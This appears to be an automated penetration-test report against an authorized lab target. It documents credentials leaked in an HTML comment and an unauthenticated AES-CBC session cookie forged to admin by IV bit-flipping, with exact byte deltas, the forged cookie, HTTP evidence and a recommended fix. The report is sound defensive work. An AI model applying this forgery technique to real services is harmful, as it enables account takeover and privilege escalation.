# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — secret-exposure Valid credentials leaked in HTML comment on login page (test1:test1)](#finding-1)
    - [2. HIGH — session Forgeable AES-CBC (no-MAC) session cookie → privilege escalation to admin via IV bit-flipping](#finding-2)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr1ncoxj-mshacz` |
| Target | http://target.local:32829/ |
| Started | 2026-07-01T05:40:23.210Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 2 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32829`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

2 finding(s): 2 high

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [secret-exposure] Valid credentials leaked in HTML comment on login page (test1:test1)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32829/

The root login page (GET /) exposes a valid username:password pair in an HTML source comment: `<!-- test1:test1 TODO: remove-->`. Anyone who views the page source obtains working credentials. Submitting test1:test1 to POST /login returns 302 → /welcome with an authenticated `session` cookie, whereas invalid credentials return 403 "Invalid username or password". This is a full account takeover of the test1 account with no other prerequisite than reading the page source.

**Reproduction**

```
1. GET http://target.local:32829/ and view source → observe comment `<!-- test1:test1 TODO: remove-->` (ev-mr1nekxu-1).
2. Negative control: POST /login with username=nonexistentuser123&password=wrongpass123 → 403 "Invalid username or password", no session (ev-mr1nemid-2).
3. POST /login with username=test1&password=test1 → 302 Location: /welcome, Set-Cookie: session=... (ev-mr1net0q-3).
4. Repeat step 3 → identical 302 → /welcome + new session cookie (ev-mr1nfdnx-6). Authenticated access confirmed, repeatable.
```

**Evidence**

- Evidence `ev-mr1nemid-2` — `artifacts/s-0001/ev-mr1nemid-2/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=nonexistentuser123&password=wrongpass123
```

Response:

```http
HTTP/1.1 403
connection: close
content-length: 28
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:41:52 GMT
server: Werkzeug/3.0.6 Python/3.8.20

Invalid username or password
```

- Evidence `ev-mr1net0q-3` — `artifacts/s-0001/ev-mr1net0q-3/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=test1&password=test1
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 203
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:42:01 GMT
location: /welcome
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/welcome">/welcome</a>. If not, click the link.
```

- Evidence `ev-mr1nfdnx-6` — `artifacts/s-0001/ev-mr1nfdnx-6/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

username=test1&password=test1
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 203
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:42:28 GMT
location: /welcome
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/welcome">/welcome</a>. If not, click the link.
```

<a id="finding-2"></a>

### 2. [HIGH] [session] Forgeable AES-CBC (no-MAC) session cookie → privilege escalation to admin via IV bit-flipping

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32829/

The `session` cookie is an AES-CBC ciphertext with the IV prepended and NO integrity protection (no MAC / not authenticated encryption). Its plaintext is simply the username, null-padded to one 16-byte block, so the cookie is exactly 32 bytes = IV(16) || C1(16). CBC decrypts the first block as P1 = Dec(C1) XOR IV, and the username sits at offset 0 of P1, so an attacker holding ANY valid low-privilege cookie can flip bytes of the IV to arbitrarily rewrite the decrypted username WITHOUT touching the ciphertext block — and with no MAC the server cannot detect the tampering. Low-privilege creds test1:test1 are leaked in an HTML comment on /; that login yields plaintext `test1\x00...`. XORing IV bytes 0-4 with the 'test1'->'admin' delta (0x15 0x01 0x1e 0x1d 0x5f) rewrites the username to `admin`; presenting the forged cookie to /welcome authenticates the request as admin and returns admin-only content. Any authenticated user (or anyone who can obtain a single valid cookie) can thus impersonate admin — full vertical privilege escalation / identity takeover.

**Reproduction**

```
1. GET / and read the HTML comment to obtain low-priv creds `test1:test1`.
2. POST /login (username=test1&password=test1) -> 302 sets session=<32 hex bytes> (login #1: IV=ab8a577b3e7cf384dfdfaeb3f210750e, C1=4b76061128b9c954e3fb55da59dd9a09). GET /welcome with it shows "Welcome, test1!" (evidence ev-mr1nnjd9-s).
3. Confirm layout: flip IV bytes 9-13 -> /welcome (ev-mr1noyrj-u) echoes the exact XOR deltas at those positions ("test1\x00\x00\x00\x00\x15\x01\x1e\x1d_"), proving plaintext = username at offset 0, null-padded, tampering undetected (no MAC).
4. Forge admin: IV bytes 0-4 (ab 8a 57 7b 3e) XOR delta (15 01 1e 1d 5f) = be 8b 49 66 61. Forged cookie = be8b4966617cf384dfdfaeb3f210750e + 4b76061128b9c954e3fb55da59dd9a09 (ciphertext block unchanged).
5. GET /welcome with the forged cookie (ev-mr1npoeq-v) -> "Welcome, Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}!".
probe_scenario: negative control ev-mr1nqd65-w (legitimate test1 cookie) lacks the admin/flag marker; positive replays ev-mr1nqdel-x and ev-mr1nqdn2-y (forged admin cookie) return it stably on both replays.
Fix: use authenticated encryption (AES-GCM) or add an HMAC over IV||ciphertext and reject cookies that fail verification; do not derive identity from an unauthenticated, malleable ciphertext.
```

**Evidence**

- Evidence `ev-mr1nqd65-w` — `artifacts/_/ev-mr1nqd65-w/`

Request:

```http
GET /welcome HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 142
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:51:00 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <h1>Welcome, test1!</h1>
</body>
</html>
```

- Evidence `ev-mr1nqdel-x` — `artifacts/_/ev-mr1nqdel-x/`

Request:

```http
GET /welcome HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 213
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:51:00 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <h1>Welcome, Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}!</h1>
</body>
</html>
```

- Evidence `ev-mr1nqdn2-y` — `artifacts/_/ev-mr1nqdn2-y/`

Request:

```http
GET /welcome HTTP/1.1
Host: target.local:32829
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 213
content-type: text/html; charset=utf-8
date: Wed, 01 Jul 2026 05:51:01 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <h1>Welcome, Welcome admin! Here is your flag: flag{60afd62a-6165-42f9-9b06-e45c453d2902}!</h1>
</body>
</html>
```
